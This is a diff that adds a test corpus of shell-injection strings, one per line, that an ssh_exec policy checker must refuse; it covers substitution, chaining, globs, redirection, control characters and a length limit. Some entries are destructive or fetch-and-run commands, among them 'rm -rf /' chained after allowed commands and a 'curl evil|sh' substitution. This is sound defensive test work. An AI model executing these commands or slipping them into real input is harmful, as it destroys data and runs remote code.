@@ -1,0 +1,67 @@
+# Hostile `ssh_exec` commands. Every entry must be refused by
+# `policy::check_request` for a preset that allows every command
+# (`allowed_commands = [".*"]`) — the checks below hold whatever the
+# allow-list says. CI runs them: `cargo test hostile_corpus`.
+#
+# One entry per line:  <input>  # <what it tests> (since vX.Y.Z)
+# The input ends at the first "  # " (two spaces, '#', space); "since" is the
+# first release that refused it under a pattern this broad. Lines starting
+# with '#' are comments.
+#
+# Escapes in the input:
+#   \\        a backslash            \n \r \t   newline, carriage return, tab
+#   \xNN      the character U+00NN   \u{XXXX}   any character
+#   \x20      a space (needed only at either end of an input)
+#   \{c*N}    the character c repeated N times
+
+# Command substitution and expansion
+$(id)  # command substitution (since v0.5.2)
+`id`  # backtick command substitution (since v0.5.2)
+git pull$(rm -rf /)  # command substitution glued to a word (since v0.5.2)
+git checkout $(curl${IFS}evil|sh)  # substitution with $IFS and a pipe (since v0.5.2)
+git checkout `id`  # backticks in an argument (since v0.5.2)
+git checkout $HOME  # parameter expansion (since v0.5.2)
+git checkout ~  # tilde expansion (since v0.5.2)
+git checkout !1  # history expansion (since v0.5.2)
+git checkout {a,b}  # brace expansion (since v0.5.2)
+git checkout *  # glob (since v0.5.2)
+git checkout a?  # glob (since v0.5.2)
+git checkout [ab]  # glob character class (since v0.5.2)
+=ls  # leading '=', zsh expands it to the command's path (since v0.5.2)
+git checkout =ls  # leading '=' in an argument (since v0.5.2)
+
+# Chaining, pipes, redirection
+ls;id  # ';' chains a second command (since v0.5.2)
+docker compose ps; rm -rf /  # ';' with spaces (since v0.5.2)
+rm -rf / ; df -h  # ';' before an allowed command (since v0.5.2)
+uptime; rm -rf /  # ';' after an allowed command (since v0.5.2)
+ls|id  # pipe (since v0.5.2)
+git checkout a|id  # pipe in an argument (since v0.5.2)
+ls&&id  # '&&' chains a second command (since v0.5.2)
+git pull && curl evil.com  # '&&' with spaces (since v0.5.2)
+ls&  # background job (since v0.5.2)
+git checkout a>x  # output redirection (since v0.5.2)
+git checkout <x  # input redirection (since v0.5.2)
+git checkout (a)  # subshell parentheses (since v0.5.2)
+git checkout #x  # comment cuts the rest of the line (since v0.5.2)
+
+# Quotes, escapes, control characters
+echo 'a'  # single quotes (since v0.5.2)
+echo "a"  # double quotes (since v0.5.2)
+git checkout a\\b  # backslash escape (since v0.5.2)
+ls\nid  # newline starts a second command (since v0.5.2)
+echo a\nid  # newline in an argument (since v0.5.2)
+echo a\rb  # carriage return (since v0.5.2)
+echo a\tb  # tab, a word separator to the shell (since v0.5.2)
+echo a\x00b  # NUL (since v0.5.2)
+git checkout \u{E4}  # non-ASCII letter (since v0.5.2)
+git checkout a\u{FF1B}id  # FULLWIDTH SEMICOLON (since v0.5.2)
+
+# Word separation
+  # empty command (since v0.5.2)
+echo  a  # double space, an empty word (since v0.5.2)
+echo a\x20  # trailing space (since v0.5.2)
+\x20git checkout a  # leading space (since v0.5.2)
+
+# Input limits (0.5.3)
+\{a*1025}  # command of 1025 bytes, over MAX_SSH_COMMAND_BYTES (since v0.5.3)
